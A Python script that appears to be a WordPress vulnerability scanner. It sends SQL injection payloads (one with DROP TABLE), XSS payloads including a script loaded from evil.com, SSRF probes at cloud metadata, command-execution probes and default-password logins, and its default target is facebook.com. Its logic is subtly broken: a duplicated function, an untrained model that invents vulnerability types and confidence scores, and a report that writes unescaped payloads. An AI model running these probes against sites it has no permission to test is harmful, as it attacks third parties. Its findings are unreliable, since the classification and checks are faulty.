import requests
import time
from datetime import datetime
import numpy as np
from sklearn.ensemble import IsolationForest
from sklearn.feature_extraction.text import TfidfVectorizer
import joblib
import tensorflow as tf
from transformers import AutoTokenizer, TFAutoModelForSequenceClassification
import os
import html
# List of common paths to check for vulnerabilities and their descriptions
vulnerability_checks = {
    'wp-admin/install.php': "WordPress installation script is accessible. This could allow reinstallation and potential data loss or unauthorized access.",
    'wp-login.php': "WordPress login page is exposed. Ensure secure passwords and consider using security plugins to limit login attempts.",
    'wp-content/debug.log': "Debug log file is accessible. This file may contain sensitive information about the site configuration.",
    'wp-content/uploads/': "Uploads directory is accessible. It might contain sensitive files if not properly protected.",
    'wp-content/plugins/': "Plugins directory is accessible. Exposed plugin information can help attackers target known vulnerabilities.",
    'wp-json/wp/v2/users': "User enumeration via REST API is possible. This could expose usernames, making it easier to launch brute force attacks.",
    '.env': "Environment file is accessible. This file may contain sensitive information such as database credentials.",
    'xmlrpc.php': "XML-RPC interface is enabled. This can be used for DDoS attacks or brute force attacks if not properly secured.",
    '.git/': "Git directory is accessible. This may expose source code and sensitive data.",
    'wp-config.php.bak': "Backup of wp-config file is accessible. This file could contain database credentials and other sensitive information.",
    'backup.zip': "Common backup file is accessible. This file may contain sensitive data.",
    'old/': "Old directory is accessible. It might contain outdated files that could have vulnerabilities.",
    'test/': "Test directory is accessible. It might contain unprotected scripts and files.",
    'phpinfo.php': "PHP info file is accessible. This file can expose server configuration details that could aid in an attack.",
    'config.old.php': "Old config file is accessible. This could expose sensitive information.",
    'backup.sql': "SQL backup file is accessible. This could contain sensitive data."
}

# List of common SQL injection and XSS tests
sql_injection_tests = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
xss_tests = [
    "<script>alert('XSS')</script>",
    "<script src='http://evil.com/xss.js'></script>",
    "<div onmouseover='alert(\"XSS\")'>Hover over me</div>",
    "\"><script>alert('XSS')</script>",
    "<sCriPt>alert('XSS')</sCriPt>",
    "<scr%69pt>alert('XSS')</scr%69pt>",
    "<script src='http://evil.com/xss.js'></script",
    "<div style=\"width: expression(alert('XSS'));\">"
]


# Basic login credentials for brute-force simulation (use carefully)
login_tests = [
    ('admin', 'password'),  # Common username and password
    ('admin', 'admin'),    # Common username and password
]

# List of common files for CSRF testing
csrf_test_files = ['wp-admin/admin-ajax.php', 'wp-login.php']

# Payloads for SSRF and RCE testing
ssrf_payloads = [
    'http://localhost',
    'http://127.0.0.1',
    'http://169.254.169.254/latest/meta-data/',  # AWS metadata service
]
rce_payloads = [
    'phpinfo()',  # Common RCE test payload
    'system("ls")',  # Test command execution
]

# HTML header and styles
HTML_HEADER = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vulnerability Scan Report</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; color: #333; margin: 0; padding: 20px; }
        h1 { color: #444; }
        table { width: 100%; border-collapse: collapse; margin-top: 20px; }
        th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
        th { background-color: #f2f2f2; }
        tr:nth-child(even) { background-color: #f9f9f9; }
        .critical { color: red; font-weight: bold; }
        .warning { color: orange; }
        .info { color: blue; }
        .error { color: darkred; }
    </style>
</head>
<body>
    <h1>Vulnerability Scan Report</h1>
    <table>
        <tr>
            <th>Timestamp</th>
            <th>Level</th>
            <th>URL</th>
            <th>Message</th>
        </tr>
"""

# HTML footer
HTML_FOOTER = """
    </table>
</body>
</html>
"""

# Function to check if a URL is vulnerable
def check_vulnerability(url, description):
    try:
        response = requests.get(url, timeout=10)  # Setting a timeout to avoid hanging
        if response.status_code == 200:
            result = f"[VULNERABLE] {url} - {description}"
            log_vulnerability(url, description, "CRITICAL")
        elif response.status_code == 403:
            result = f"[INFO] Access denied at: {url} (403 Forbidden)"
            log_vulnerability(url, "Access denied (403 Forbidden)", "INFO")
        elif response.status_code == 404:
            result = f"[INFO] Not found: {url} (404 Not Found)"
            log_vulnerability(url, "Not found (404 Not Found)", "INFO")
        else:
            result = f"[INFO] Unexpected status code {response.status_code} at: {url}"
            log_vulnerability(url, f"Unexpected status code {response.status_code}", "INFO")
        print(result)
    except requests.RequestException as e:
        result = f"[ERROR] Error checking {url}: {e}"
        log_vulnerability(url, f"Request error: {e}", "ERROR")
        print(result)

# Function to perform banner grabbing
def banner_grabbing(url):
    try:
        response = requests.get(url, timeout=10)
        server_header = response.headers.get('Server', 'Unknown')
        x_powered_by_header = response.headers.get('X-Powered-By', 'Unknown')
        result = f"[INFO] Server: {server_header}, X-Powered-By: {x_powered_by_header}"
        log_vulnerability(url, f"Server: {server_header}, X-Powered-By: {x_powered_by_header}", "INFO")
        print(result)
    except requests.RequestException as e:
        result = f"[ERROR] Error performing banner grabbing at {url}: {e}"
        log_vulnerability(url, f"Banner grabbing error: {e}", "ERROR")
        print(result)

# Function to check for SQL injection and XSS vulnerabilities
def check_input_vulnerabilities(url):
    for test in sql_injection_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "SQL" in response.text or "syntax" in response.text:
                result = f"[VULNERABLE] SQL Injection possible at: {url} with payload: {test}"
                log_vulnerability(url, f"SQL Injection possible with payload: {test}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for SQL Injection at {url}: {e}"
            log_vulnerability(url, f"SQL Injection check error: {e}", "ERROR")
            print(result)

    for test in xss_tests:
        try:
            response = requests.get(f"{url}?test={test}", timeout=10)
            if "<script>" in response.text or "alert('XSS')" in response.text:
                escaped_test = html.escape(test)
                result = f"[VULNERABLE] XSS possible at: {url} with payload: {escaped_test}"
                log_vulnerability(url, f"XSS possible with payload: {escaped_test}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for XSS at {url}: {e}"
            log_vulnerability(url, f"XSS check error: {e}", "ERROR")
            print(result)

# Function to perform brute force login attempts
def brute_force_login(url, login_tests):
    for username, password in login_tests:
        try:
            response = requests.post(url, data={'log': username, 'pwd': password}, timeout=10)
            if response.status_code == 200 and "wp-login.php" in response.url:
                result = f"[INFO] Brute force test with username '{username}' and password '{password}' succeeded."
                log_vulnerability(url, f"Brute force login succeeded with username '{username}' and password '{password}'", "WARNING")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error performing brute force login test at {url}: {e}"
            log_vulnerability(url, f"Brute force login test error: {e}", "ERROR")
            print(result)

# Function to check for CSRF vulnerabilities
def check_csrf_vulnerabilities(base_url):
    for path in csrf_test_files:
        full_url = base_url + path
        try:
            response = requests.get(full_url, timeout=10)
            if response.status_code == 200:
                result = f"[INFO] CSRF test file found at: {full_url}"
                log_vulnerability(full_url, "Potential CSRF test file found.", "WARNING")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking CSRF vulnerabilities at {full_url}: {e}"
            log_vulnerability(full_url, f"CSRF check error: {e}", "ERROR")
            print(result)

# Function to check for SSRF vulnerabilities
def check_ssrf_vulnerabilities(url):
    for payload in ssrf_payloads:
        try:
            response = requests.get(url + payload, timeout=10)
            if response.status_code == 200:
                result = f"[VULNERABLE] SSRF possible at: {url} with payload: {payload}"
                log_vulnerability(url, f"SSRF possible with payload: {payload}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for SSRF at {url}: {e}"
            log_vulnerability(url, f"SSRF check error: {e}", "ERROR")
            print(result)

# Function to check for RCE vulnerabilities
def check_rce_vulnerabilities(url):
    for payload in rce_payloads:
        try:
            response = requests.get(f"{url}?cmd={payload}", timeout=10)
            if "phpinfo" in response.text or "ls" in response.text:
                result = f"[VULNERABLE] RCE possible at: {url} with payload: {payload}"
                log_vulnerability(url, f"RCE possible with payload: {payload}", "CRITICAL")
                print(result)
        except requests.RequestException as e:
            result = f"[ERROR] Error checking for RCE at {url}: {e}"
            log_vulnerability(url, f"RCE check error: {e}", "ERROR")
            print(result)

# New ML model for anomaly detection
def train_anomaly_detection_model(data):
    vectorizer = TfidfVectorizer()
    X = vectorizer.fit_transform(data)
    model = IsolationForest(contamination=0.1, random_state=42)
    model.fit(X)
    joblib.dump((vectorizer, model), 'anomaly_detection_model.joblib')

# Load pre-trained model for vulnerability classification
tokenizer = AutoTokenizer.from_pretrained("microsoft/codebert-base")
model = TFAutoModelForSequenceClassification.from_pretrained("microsoft/codebert-base")

# Function to classify vulnerability using the pre-trained model
def classify_vulnerability(text):
    inputs = tokenizer(text, return_tensors="tf", truncation=True, padding=True, max_length=512)
    outputs = model(inputs)
    prediction = tf.nn.softmax(outputs.logits, axis=-1)
    return prediction.numpy()[0]

# Enhanced function to check for vulnerabilities
def check_vulnerability(url, description):
    try:
        response = requests.get(url, timeout=10)
        if response.status_code == 200:
            content = response.text
            # Use the pre-trained model to classify the vulnerability
            vulnerability_scores = classify_vulnerability(content)
            vulnerability_type = ["SQL Injection", "XSS", "CSRF", "RCE", "Other"][np.argmax(vulnerability_scores)]
            confidence = np.max(vulnerability_scores)
            
            result = f"[VULNERABLE] {url} - {description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})"
            log_vulnerability(url, f"{description} (Type: {vulnerability_type}, Confidence: {confidence:.2f})", "CRITICAL")
        elif response.status_code == 403:
            result = f"[INFO] Access denied at: {url} (403 Forbidden)"
            log_vulnerability(url, "Access denied (403 Forbidden)", "INFO")
        elif response.status_code == 404:
            result = f"[INFO] Not found: {url} (404 Not Found)"
            log_vulnerability(url, "Not found (404 Not Found)", "INFO")
        else:
            result = f"[INFO] Unexpected status code {response.status_code} at: {url}"
            log_vulnerability(url, f"Unexpected status code {response.status_code}", "INFO")
        print(result)
    except requests.RequestException as e:
        result = f"[ERROR] Error checking {url}: {e}"
        log_vulnerability(url, f"Request error: {e}", "ERROR")
        print(result)

# Function to detect anomalies in server responses
def detect_anomalies(responses):
    model_file = 'anomaly_detection_model.joblib'
    if not os.path.exists(model_file):
        print("[INFO] Anomaly detection model not found. Training a new one...")
        train_anomaly_detection_model(responses)
    
    vectorizer, model = joblib.load(model_file)
    X = vectorizer.transform(responses)
    anomalies = model.predict(X)
    return anomalies

# Function to log vulnerabilities to an HTML file
def log_vulnerability(url, message, level):
    with open("vulnerability_report.html", "a") as log_file:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        css_class = level.lower()
        # Escape the message to ensure HTML characters are shown as text
        escaped_message = html.escape(message)
        log_file.write(f"<tr class='{css_class}'><td>{timestamp}</td><td>{level}</td><td>{url}</td><td>{message}</td></tr>\n")

# Main function to iterate through paths and check them
def main():
    base_url = 'http://facebook.com////'  # Replace with your website's base URL 
    print("[INFO] Starting vulnerability scan...")

    # Initialize HTML report
    with open("vulnerability_report.html", "w") as log_file:
        log_file.write(HTML_HEADER)

    # Perform banner grabbing to identify server info
    banner_grabbing(base_url)

    # Collect responses for anomaly detection
    responses = []

    # Check for specific vulnerabilities in common paths
    for path, description in vulnerability_checks.items():
        full_url = base_url + path
        check_vulnerability(full_url, description)
        try:
            response = requests.get(full_url, timeout=10)
            responses.append(response.text)
        except requests.RequestException:
            responses.append("")  # Add an empty string if request fails
        time.sleep(1)  # 1 second delay between requests


     # Perform anomaly detection
    if responses:
        anomalies = detect_anomalies(responses)
        for i, is_anomaly in enumerate(anomalies):
            if is_anomaly == -1:  # -1 indicates an anomaly
                log_vulnerability(list(vulnerability_checks.keys())[i], "Anomalous response detected", "WARNING")
    else:
        print("[WARNING] No responses collected for anomaly detection.")
    # Check for SQL injection and XSS vulnerabilities in common input parameters
    check_input_vulnerabilities(base_url)

    # Perform brute force login attempts
    brute_force_login(base_url + 'wp-login.php', login_tests)

    # Check for CSRF vulnerabilities
    check_csrf_vulnerabilities(base_url)

    # Check for SSRF vulnerabilities
    check_ssrf_vulnerabilities(base_url)

    # Check for RCE vulnerabilities
    check_rce_vulnerabilities(base_url)

    # Close the HTML report
    with open("vulnerability_report.html", "a") as log_file:
        log_file.write(HTML_FOOTER)

    print("[INFO] Vulnerability scan completed. Check vulnerability_report.html for results.")

if __name__ == "__main__":
    main()
